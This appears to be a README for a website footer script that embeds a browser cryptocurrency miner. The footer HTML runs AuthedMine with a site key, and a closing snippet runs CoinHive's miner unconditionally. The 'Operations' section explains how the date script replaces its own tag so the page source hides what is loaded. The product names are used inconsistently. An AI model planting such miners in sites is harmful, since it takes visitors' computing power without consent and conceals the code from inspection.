# footer-authedmine.js

### [Footer] with [AuthedMine]

The [CoinHive] version of this footer is available at [footer-coinhive.js]

## footer.html

```html
<footer class="container" id="footer">
    <script src="http://cdn.mf/date.js/footer-date.js"></script>
</footer>
<script type="text/javascript" src="https://code.jquery.com/jquery-1.12.0.min.js"></script>
<script src="https://authedmine.com/lib/authedmine.min.js"></script>
<script>
    var miner = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.3});
    // Only start on non-mobile devices and if not opted-out in the last 3600 seconds:
    if (!miner.isMobile() && !miner.didOptOut(3600)) {
        miner.start();
    }
</script>
```

## footer-date.js

```javascript
var d = new Date();
var y = 0;
var year = d.getFullYear().toString();
var m = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
var month = m[d.getMonth()];
var footer = "";
var footer0 = "MaX Falstein gTLD &copy; MaX Falstein and Falstein Inc. &#8212; ";
var footer1 = " ";
var footer2 = " &#8212; Patents and Trademarks Pending";
footer = footer0.concat(month.concat(footer1.concat(year.concat(footer2))));
document.getElementById("footer").innerHTML = footer;
```

## Operations

The appending of `footer` to the inner HTML of the footer using `document.getElementById("footer").innerHTML` repleaces `<script src="http://cdn.mf/date.js/footer-date.js"></script>` with
`MaX Falstein gTLD &copy; MaX Falstein and Falstein Inc. &#8212; January 2018 &#8212; Patents and Trademarks Pending` giving the impression when inspecting the source the footer is not procedurally generated unless viewing the sources and network tabs in developer tools in most browsers.

The [AuthedHive] code is freely available and documentation can be found on the [CoinHive] website or specifically in the [AuthedHive documentation].

```html
<script type="text/javascript" src="https://code.jquery.com/jquery-1.12.0.min.js"></script>
<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script>var miner = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT');miner.start();</script>
```

[AuthedMine]: https://authedmine.com
[AuthedHive documentation]: https://coinhive.com/documentation/authedmine
[CoinHive]: https://coinhive.com
[Footer]: https://github.com/MaXFalstein/footer-date.js
[footer-coinhive.js]: https://github.com/MaXFalstein/footer-coinhive.js
